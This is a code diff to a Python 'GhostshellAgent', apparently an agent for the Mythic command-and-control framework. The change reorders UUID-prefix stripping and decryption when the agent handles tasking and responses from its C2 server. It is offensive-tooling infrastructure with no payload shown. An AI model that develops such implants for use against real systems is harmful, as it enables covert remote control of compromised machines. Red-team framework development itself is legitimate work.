@@ -60,13 +60,13 @@ class GhostshellAgent:
     def postMessageAndRetrieveResponse(self, data):
         """POST a Mythic action envelope, return the parsed response dict.
         Raises C2Error on transport failure (caught by the beacon loop)."""
-        return self._format_response(self.crypto.decrypt(
-            self.c2.make_request(self._format_message(data), method="POST")))
+        raw = self.c2.make_request(self._format_message(data), method="POST")
+        return self._format_response(self.crypto.decrypt(self._strip_uuid(raw)))
 
     def getMessageAndRetrieveResponse(self, data):
         """GET tasking, return the parsed response dict."""
-        return self._format_response(self.crypto.decrypt(
-            self.c2.make_request(self._format_message(data, urlsafe=True), method="GET")))
+        raw = self.c2.make_request(self._format_message(data, urlsafe=True), method="GET")
+        return self._format_response(self.crypto.decrypt(self._strip_uuid(raw)))
 
     def sendTaskOutputUpdate(self, task_id, output):
         """Stream mid-execution output without completing the task. Best-effort,
@@ -123,13 +123,21 @@ class GhostshellAgent:
         raw = uuid_bytes + encrypted
         return base64.urlsafe_b64encode(raw) if urlsafe else base64.b64encode(raw)
 
+    def _strip_uuid(self, raw):
+        """Strip the callback/payload UUID prefix from a Mythic response.
+        Mythic returns UUID(36 bytes ASCII) + encrypted_data. The crypto layer
+        needs only the encrypted_data part."""
+        if not raw:
+            return raw
+        uuid_prefix = (self.uuid or self.callback_uuid).encode()
+        if raw.startswith(uuid_prefix):
+            return raw[len(uuid_prefix):]
+        return raw
+
     def _format_response(self, data):
-        """Strip the UUID prefix + parse the JSON response."""
+        """Parse the decrypted JSON response from Mythic."""
         if not data:
             return {}
-        uuid_prefix = (self.uuid or self.callback_uuid).encode()
-        if data.startswith(uuid_prefix):
-            data = data[len(uuid_prefix):]
         try:
             return json.loads(data.decode() if isinstance(data, bytes) else data)
         except Exception:
